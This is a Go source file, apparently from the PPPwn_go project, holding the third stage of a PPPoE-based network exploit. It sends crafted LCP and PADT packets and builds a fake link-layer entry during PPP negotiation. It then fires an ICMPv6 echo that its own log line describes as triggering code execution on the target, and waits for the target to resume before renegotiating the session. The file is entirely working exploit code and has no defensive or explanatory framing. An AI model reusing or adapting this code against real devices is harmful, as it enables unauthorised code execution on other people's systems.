package exploit

import (
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"

	"github.com/wetor/PPPwn_go/internal/lcp"
	"github.com/wetor/PPPwn_go/internal/logger"
	"github.com/wetor/PPPwn_go/internal/packet"
	"github.com/wetor/PPPwn_go/internal/pppoe"
)

func (e *Exploit) runStage3() (err error) {
	logger.Infof("[*] Sending LCP terminate request...")
	err = e.p.SendLCP(&packet.SendLCPParams{
		SrcMAC:       e.sourceMac,
		DstMAC:       e.targetMac,
		EthernetType: layers.EthernetTypePPPoESession,
		SessionID:    SESSION_ID,
		LCP: &lcp.Pkt{
			Proto: lcp.ProtoLCP,
			Code:  lcp.CodeTerminateRequest,
		},
	})
	if err != nil {
		return err
	}

	err = e.pppNegotiation(e.BuildFakeLle, false)
	if err != nil {
		return err
	}

	logger.Infof("[*] Triggering code execution...")
	err = e.p.SendICMPv6(&packet.SendICMPv6Params{
		SrcMAC:       e.sourceMac,
		DstMAC:       e.targetMac,
		EthernetType: layers.EthernetTypeIPv6,
		SrcIP:        net.ParseIP(SOURCE_IPV6),
		DstIP:        e.targetIPv6,
		HopLimit:     64,
		ICMPv6Type:   layers.ICMPv6TypeEchoRequest,
		Layers: []gopacket.SerializableLayer{
			&layers.ICMPv6Echo{},
		},
	})
	if err != nil {
		return err
	}
	logger.Infof("[*] Waiting for stage1 to resume...")
	count := 0
	for count < 3 {
		_, _, err = e.p.ReceiveLCP(e.ctx, lcp.ProtoLCP, lcp.CodeConfigureRequest)
		if err != nil {
			return err
		}
		count++
	}

	logger.Infof("[*] Sending PADT...")
	err = e.p.Send(&packet.SendParams{
		FixLengths: true,
		Layers: []gopacket.SerializableLayer{
			&layers.Ethernet{
				SrcMAC:       e.sourceMac,
				DstMAC:       e.targetMac,
				EthernetType: layers.EthernetTypePPPoEDiscovery,
			},
			&pppoe.Pkt{
				Code:      layers.PPPoECodePADT,
				SessionID: SESSION_ID,
			},
		},
	})
	if err != nil {
		return err
	}

	err = e.pppNegotiation(nil, false)
	if err != nil {
		return err
	}
	err = e.lcpNegotiation()
	if err != nil {
		return err
	}
	err = e.ipcpNegotiation()
	if err != nil {
		return err
	}
	return nil
}
